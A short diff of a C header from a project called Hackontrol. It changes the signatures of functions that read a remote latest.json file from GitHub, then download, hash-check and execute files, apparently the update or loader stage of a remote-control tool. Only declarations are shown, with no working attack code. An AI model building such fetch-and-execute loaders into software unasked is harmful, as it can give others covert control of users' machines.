@@ -7,7 +7,7 @@
 #define FUNCTION_LIBUPDATE32 "Update"
 #define URL_LATEST_FILE      "https://raw.githubusercontent.com/KHOPAN/Hackontrol/main/system/latest.json"
 
-typedef void(__stdcall* ENTRYPOINTFUNCTION) (const cJSON* const root);
+typedef void(__stdcall* ENTRYPOINTFUNCTION) (const cJSON* const root, const LPCWSTR folderHackontrol);
 
 typedef struct {
 	LPCSTR fullName;
@@ -27,6 +27,6 @@ void ProcessEntrypointSleep(cJSON* root);
 LPWSTR ExecuteGetFile(const cJSON* const root, const LPCWSTR folderHackontrol);
 BOOL ExecuteHashFileCheck(const cJSON* const root, const LPCWSTR file);
 void ExecuteDownload(const cJSON* const root, const LPCWSTR folderHackontrol);
-void ExecuteExecute(const cJSON* const root);
+void ExecuteExecute(const cJSON* const root, const LPCWSTR folderHackontrol);
 
-void ExecuteEntrypointExecutable(const cJSON* const root);
+void _stdcall ExecuteEntrypointExecutable(const cJSON* const root, const LPCWSTR folderHackontrol);
